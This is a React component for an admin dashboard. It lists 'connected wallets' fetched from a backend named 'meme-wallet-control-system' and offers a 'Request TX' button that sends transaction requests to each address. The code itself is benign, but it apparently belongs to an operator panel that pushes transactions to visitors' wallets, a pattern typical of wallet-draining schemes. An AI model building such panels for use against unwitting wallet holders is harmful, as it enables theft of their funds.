import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";

function Wallets() {
  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  const backend = "https://meme-wallet-control-system-hx1r.vercel.app";

  useEffect(() => {
    fetch(backend + "/api/admin-get-wallets")
      .then((res) => res.json())
      .then((data) => {
        setWallets(data.wallets || []);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, []);

  const openSendRequest = (walletAddress) => {
    navigate("/send-request", { state: { walletAddress } });
  };

  return (
    <div>
      <h2>Connected Wallets</h2>

      {loading ? (
        <p>Loading wallets...</p>
      ) : (
        <table className="table">
          <thead>
            <tr>
              <th>#</th>
              <th>Wallet Address</th>
              <th>Chain</th>
              <th>Wallet Name</th>
              <th>Time</th>
              <th>Send Request</th>
            </tr>
          </thead>

          <tbody>
            {wallets.map((w, i) => (
              <tr key={w.id}>
                <td>{i + 1}</td>
                <td>{w.address}</td>
                <td>{w.chain}</td>
                <td>{w.walletName}</td>
                <td>{w.time}</td>
                <td>
                  <button
                    className="btn-small"
                    onClick={() => openSendRequest(w.address)}
                  >
                    Request TX
                  </button>
                </td>
              </tr>
            ))}

            {wallets.length === 0 && (
              <tr>
                <td colSpan="6" style={{ textAlign: "center" }}>
                  No wallets found
                </td>
              </tr>
            )}
          </tbody>
        </table>
      )}
    </div>
  );
}

export default Wallets;
